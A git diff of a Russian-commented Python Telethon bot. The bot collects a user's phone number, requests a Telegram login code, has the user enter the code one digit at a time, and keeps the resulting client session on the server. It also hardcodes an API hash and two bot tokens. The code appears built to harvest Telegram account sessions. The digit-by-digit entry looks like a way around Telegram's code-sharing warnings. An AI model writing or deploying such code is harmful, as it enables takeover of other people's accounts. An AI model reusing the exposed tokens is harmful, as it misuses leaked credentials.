@@ -12,9 +12,9 @@ from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator
 OWNER_ID = 7179318927  # Замените на ваш ID
 
 # Укажите свои данные API
-API_ID = "26556187"
+API_ID = 26556187
 API_HASH = "cc6f1344a315e9bb79fd4bf37b16794d"
-BOT_TOKEN = "7794200983:AAGcf4ofG_75yFwKRk7HSl_gpDVtsHsBAeU"
+BOT_TOKEN = "7306593002:AAFA540655TxgCELgLvrtFtgmELwZKkT5-g"
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
@@ -1130,47 +1130,44 @@ async def handle_response(event):
         # Запрашиваем код авторизации
         session_path = get_session_path(user_id)
         client = TelegramClient(session_path, API_ID, API_HASH)
-        try:
-            await client.connect()
 
-            # Проверяем подключение
-            if not await client.is_connected():
-                await event.respond("Ошибка подключения к серверам Telegram.")
-                return
+        await client.connect()
 
-            # Запрос кода с обработкой FloodWait
-            try:
-                code_request = await client.send_code_request(phone_number)
-                logger.info(f"Code request response: {code_request}")
-            except FloodWaitError as e:
-                wait_time = e.seconds
-                logger.error(f"FloodWaitError: Need to wait {wait_time} seconds")
-                await event.respond(f"⚠️ Слишком много попыток. Попробуйте через {wait_time // 60} минут.")
-                return
-            except PhoneNumberInvalidError:
-                await event.respond("❌ Неверный номер телефона.")
-                return
-            except Exception as e:
-                logger.error(f"Error sending code: {str(e)}")
-                await event.respond("🚫 Ошибка при отправке кода. Попробуйте позже.")
-                return
-
-            phone_codes[user_id] = {
-                'phone_code_hash': code_request.phone_code_hash,
-                'client': client,
-                'current_code': ''
-            }
-
-            # Логируем информацию о подключении
-            logger.info(f"Connected: {await client.is_connected()}")
-            logger.info(f"Authorized: {await client.is_user_authorized()}")
-
-            await event.respond("✅ Код авторизации отправлен. Вводите цифры по одной.")
-
-        except Exception as e:
-            logger.error(f"Connection error: {str(e)}")
-            await event.respond("⚠️ Ошибка подключения к Telegram. Проверьте сетевые настройки сервера.")
+        # Проверяем подключение
+        if not client.is_connected():
+            await event.respond("Ошибка подключения к серверам Telegram.")
             return
+
+        # Запрос кода с обработкой FloodWait
+        try:
+            code_request = await client.send_code_request(phone_number)
+            logger.info(f"Code request response: {code_request}")
+        except FloodWaitError as e:
+            wait_time = e.seconds
+            logger.error(f"FloodWaitError: Need to wait {wait_time} seconds")
+            await event.respond(f"⚠️ Слишком много попыток. Попробуйте через {wait_time // 60} минут.")
+            return
+        except PhoneNumberInvalidError:
+            await event.respond("❌ Неверный номер телефона.")
+            return
+        except Exception as e:
+            logger.error(f"Error sending code: {str(e)}")
+            await event.respond("🚫 Ошибка при отправке кода. Попробуйте позже.")
+            return
+
+        phone_codes[user_id] = {
+            'phone_code_hash': code_request.phone_code_hash,
+            'client': client,
+            'current_code': ''
+        }
+
+        # Логируем информацию о подключении
+        # logger.info(f"Connected: {await client.is_connected()}")
+        logger.info(f"Authorized: {await client.is_user_authorized()}")
+
+        await event.respond("✅ Код авторизации отправлен. Вводите цифры по одной.")
+
+
 
     # Шаг 2: ввод кода авторизации по одной цифре
     elif state['stage'] == 'waiting_code':
